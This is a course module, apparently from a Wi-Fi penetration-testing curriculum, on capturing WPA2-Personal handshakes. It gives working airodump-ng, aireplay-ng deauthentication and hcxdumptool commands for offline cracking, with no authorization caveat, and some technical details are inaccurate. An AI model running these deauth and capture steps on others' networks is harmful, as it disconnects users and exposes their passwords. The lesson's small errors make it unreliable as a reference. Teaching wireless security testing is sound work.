# Module 06 — Capturing the WPA2 4-Way Handshake

> **Prerequisites:** [Module 05 — WEP Cracking](../module-05-wep-cracking/)
> **Next Module:** [Module 07 — WPA2 Cracking](../module-07-wpa2-cracking/)

---

## Table of Contents

1. [Introduction to WPA2 Security](#1-introduction-to-wpa2-security)
2. [WPA2 Encryption Components](#2-wpa2-encryption-components)
3. [The 4-Way Handshake Explained](#3-the-4-way-handshake-explained)
4. [Handshake Capture Methods](#4-handshake-capture-methods)
5. [Passive Capture](#5-passive-capture)
6. [Active Capture with Deauthentication](#6-active-capture-with-deauthentication)
7. [Using hcxdumptool for Advanced Capture](#7-using-hcxdumptool-for-advanced-capture)
8. [Verifying Captured Handshakes](#8-verifying-captured-handshakes)
9. [Common Issues and Troubleshooting](#9-common-issues-and-troubleshooting)
10. [Knowledge Check](#10-knowledge-check)

---

## 1. Introduction to WPA2 Security

WPA2 (Wi-Fi Protected Access II) is the current standard for wireless security, introduced in 2004 to address WEP's critical flaws.

### WPA2 Variants

| Variant | Authentication | Encryption | Use Case |
|---------|---------------|------------|----------|
| **WPA2-Personal** | PSK (Pre-Shared Key) | CCMP (AES) | Home/Small business |
| **WPA2-Enterprise** | RADIUS/EAP | CCMP (AES) | Corporate networks |

This module covers **WPA2-Personal** (PSK), which is the most commonly encountered.

### Key Improvements Over WEP

- **128-bit keys** — Much stronger than WEP's 40/104-bit keys
- **Dynamic encryption keys** — Unique per-session, not static
- **MIC (Message Integrity Code)** — Replaces CRC-32, cryptographically secure
- **CCMP encryption** — Based on AES, not RC4

---

## 2. WPA2 Encryption Components

### Key Derivation

```
PBKDF2(Passphrase, SSID, 4096 iterations, 256-bit) → PMK (Pairwise Master Key)
```

The **PMK** is derived from:
- The Wi-Fi password
- The SSID (network name)
- 4096 iterations of PBKDF2

This makes offline cracking computationally expensive.

### Session Keys

From the PMK, the AP and client derive:
- **PTK (Pairwise Transient Key)** — Unique per-client session key
- **GTK (Group Temporal Key)** — Broadcast/multicast key shared by all clients

---

## 3. The 4-Way Handshake Explained

The 4-way handshake is the process where the AP and client prove they both know the PMK (without transmitting it) and establish session keys.

### Message Flow

```
┌─────────────────────────────────────────────────────────────────┐
│ Message 1: AP → Client                                          │
│   Contains: ANonce (Authenticator Nonce)                        │
│   Purpose: Give client a random value to begin key derivation   │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ Message 2: Client → AP                                          │
│   Contains: SNonce (Supplicant Nonce), MIC, RSN IE              │
│   Purpose: Prove client knows PMK, send own random value       │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ Message 3: AP → Client                                          │
│   Contains: ANonce (new), GTK, MIC                             │
│   Purpose: Complete PTK derivation, install keys                 │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ Message 4: Client → AP                                          │
│   Contains: Confirmation, MIC                                  │
│   Purpose: Confirm keys are installed                           │
└─────────────────────────────────────────────────────────────────┘
```

### What Makes Cracking Possible

While the password is never transmitted, the handshake contains:
- **ANonce and SNonce** — Public random values
- **MIC** — A hash that proves knowledge of the PMK
- **EAPOL frames** — The first two messages are partially predictable

By capturing these, we can brute-force the password offline by deriving the PMK and computing the MIC to verify correctness.

---

## 4. Handshake Capture Methods

### Method 1: Passive Capture

Simply wait for a client to authenticate. This is the stealthiest method.

```bash
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon
```

**Pros:** Completely passive, no detection
**Cons:** Can take a long time if no clients connect

### Method 2: Active Capture with Deauthentication

Force clients to re-authenticate by sending deauthentication frames.

```bash
# Terminal 1: Start capture
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon

# Terminal 2: Send deauth
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

**Pros:** Fast, reliable
**Cons:** Active, potentially detectable

### Method 3: Targeted Client Deauth

Target a specific client for faster results:

```bash
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

---

## 5. Passive Capture

### Execution

```bash
# 1. Start monitor mode
sudo airmon-ng start wlan0

# 2. Target the network
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w handshake wlan0mon
```

### What to Watch For

```
 CH  6 ][ Elapsed: 120 s ][ 2024-01-15 12:00
 BSSID              PWR  Beacons  #Data  CH  MB  ENC  CIPHER AUTH ESSID
 AA:BB:CC:DD:EE:FF  -45     1200    150   6  130  WPA2 CCMP   PSK MyNet
```

In the station section, look for:
- "WPA handshake: AA:BB:CC:DD:EE:FF" in the Notes column

---

## 6. Active Capture with Deauthentication

### Step-by-Step

```bash
# Terminal 1: Start capturing
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon
```

```bash
# Terminal 2: Send deauth attacks
# Broadcast deauth (disconnects everyone)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Or target specific client
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

### Understanding the Attack

1. Clients maintain a connection to the AP
2. Sending a deauth frame breaks that connection
3. Client automatically tries to reconnect
4. The reconnection triggers a new 4-way handshake
5. We capture the handshake during re-authentication

---

## 7. Using hcxdumptool for Advanced Capture

`hcxdumptool` is a more modern tool for capturing handshakes and PMKIDs.

### Installation

```bash
sudo apt install hcxtools
```

### Basic Usage

```bash
# Passive capture
sudo hcxdumptool -i wlan0mon -o capture.pcapng

# Active capture with deauth
sudo hcxdumptool -i wlan0mon -o capture.pcapng --active_beacon --do_rcascan
```

### Benefits of hcxdumptool

- Captures more information (PMKID, EAPOL, etc.)
- Better filtering options
- Smaller output files
- Works with hashcat directly

---

## 8. Verifying Captured Handshakes

### Method 1: aircrack-ng

```bash
sudo aircrack-ng capture-01.cap
```

**Output:**
```
Opening capture-01.cap
Read 1524 packets.

#  BSSID              ESSID         Encryption    # of IVs   Keyboard  Language
#  AA:BB:CC:DD:EE:FF  MyNetwork    WPA2 (1) handshake   0
```

The "(1) handshake" indicates one complete handshake was captured.

### Method 2: Cowpatty

```bash
cowpatty -r capture-01.cap -s MyNetwork
```

### Method 3: Wireshark

```wireshark
# Filter for EAPOL frames
eapol
```

Look for 4 EAPOL packets between the AP and client.

### Method 4: hcxpcapngtool

```bash
hcxpcapngtool -o hash.txt capture.pcapng
```

Outputs in hashcat format (22000).

---

## 9. Common Issues and Troubleshooting

### Problem: Handshake never captured

**Causes and solutions:**

1. **No clients connected**
   - Solution: Use deauth attack to force reconnection

2. **Wrong channel**
   - Solution: Verify you're on the same channel as the AP

3. **Too far from AP/client**
   - Solution: Get closer, use better antenna

4. **Driver doesn't support injection**
   - Solution: Test with `aireplay-ng -9`

### Problem: "No valid WPA handshakes found"

```bash
# Verify the capture has EAPOL frames
tcpdump -r capture-01.cap eapol
```

If no output, no handshake was captured.

### Problem: Multiple handshakes in capture

This is actually good — having multiple handshakes makes cracking more reliable:

```
# Check number of handshakes
sudo aircrack-ng capture-01.cap

# "WPA2 (4) handshake" = 4 handshakes captured
```

---

## 10. Knowledge Check

Before proceeding to Module 07, you should be able to:

1. What is the difference between WPA2-Personal and WPA2-Enterprise?
2. Describe what happens during each of the four messages in the WPA2 4-way handshake.
3. Why can we crack WPA2 by capturing the handshake even though the password is never transmitted?
4. Write the command to capture a handshake from a specific BSSID on channel 6, saving to files with prefix "capture".
5. What command would you use to force all clients on a network to reconnect using deauthentication frames?
6. How would you verify that a captured file contains a valid WPA2 handshake using aircrack-ng?
7. What are the advantages of using hcxdumptool over airodump-ng for handshake capture?
8. If a capture shows "WPA2 (3) handshake", what does that indicate?
9. Why might you want to target a specific client rather than broadcasting a deauth attack?
10. What filter would you use in Wireshark to view only EAPOL frames?

---

**Next:** [Module 07 — WPA2 Cracking — Dictionary, Rule & Brute Force](../module-07-wpa2-cracking/)
